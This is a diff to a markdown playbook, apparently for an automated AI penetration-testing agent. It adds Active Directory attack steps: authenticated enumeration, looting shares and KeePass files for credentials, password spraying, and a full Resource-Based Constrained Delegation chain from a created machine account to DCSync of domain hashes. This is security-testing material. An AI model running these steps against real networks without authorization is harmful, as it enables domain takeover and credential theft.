@@ -117,6 +117,42 @@ and returns the credentials, admin access, and any flags it captured.
 7. `netexec_smb -u <machine>$ -H <nt>` → `Pwn3d!` (admin on DC).
 8. Read the flag from `C$` (or `secretsdump` for domain hashes).
 
+## Assumed-breach / authenticated engagements
+Many real tests start WITH a credential ("assumed breach"). Provide it up front —
+`agent --target <dc> --username <u> --password <p> --domain <d>` (or the menu's
+"Starting credentials" prompt). The creds seed the store, so every credentialed
+tool and the agent use them from step one. With a foothold user, always run the
+authenticated enumeration: BloodHound (`bloodhound_python`), `kerberoast`,
+`netexec_ldap --users`, share/SYSVOL looting, and check delegation / RBCD rights.
+
+## Finding the next credential (lateral movement)
+When you have one user but no ACL path to the target, the next credential is
+usually hidden, not crackable:
+- Loot readable shares and SYSVOL/NETLOGON for scripts, configs, GPP cpassword,
+  and credential stores (`.kdbx` KeePass DBs, `.xml`, `unattend`, `web.config`).
+- **Password reuse is the most common bridge** — once you recover ANY password
+  (from a share, a KeePass DB, a cracked hash), spray it across every user with
+  `netexec_spray password=<pw>`. Help-desk / service accounts frequently share one.
+- Check user `description`/`info`/`comment` LDAP attributes for passwords.
+
+## RBCD to Domain Admin (write over a computer + MachineAccountQuota)
+<!-- when: port:88, port:445, fact:username -->
+If a controllable account can write `msDS-AllowedToActOnBehalfOfOtherIdentity`
+on a computer (BloodHound edge `AddAllowedToAct`/`GenericWrite`/`GenericAll` over
+a Computer — often the DC), you get Domain Admin via Resource-Based Constrained
+Delegation:
+1. `add_computer` — create a machine account (needs MachineAccountQuota>0; check
+   with `netexec_ldap -M maq`). Default ATTACK$ / Attack123!.
+2. `rbcd` — as the account with write rights, delegate-from your new computer,
+   delegate-to the target computer (e.g. DC01$), action write.
+3. `get_st` — as your new computer, request a ticket with `-spn cifs/<dc.fqdn>
+   -impersonate Administrator` (S4U2Proxy). It saves a `.ccache`.
+4. Use the ticket: `export KRB5CCNAME=<file>.ccache` then `secretsdump -k
+   -no-pass <dc.fqdn>` (DCSync) or read `C$` with Kerberos auth. Add the DC FQDN
+   to /etc/hosts and sync the clock to the DC (Kerberos is time-sensitive).
+This does NOT need the target computer's password — only write access to its
+delegation attribute plus a machine account you create.
+
 ## Credential flow
 Autopwn captures a username/password automatically from a NetExec success line
 ("[+] domain\\user:pass"). Once captured, the credentialed tools above become
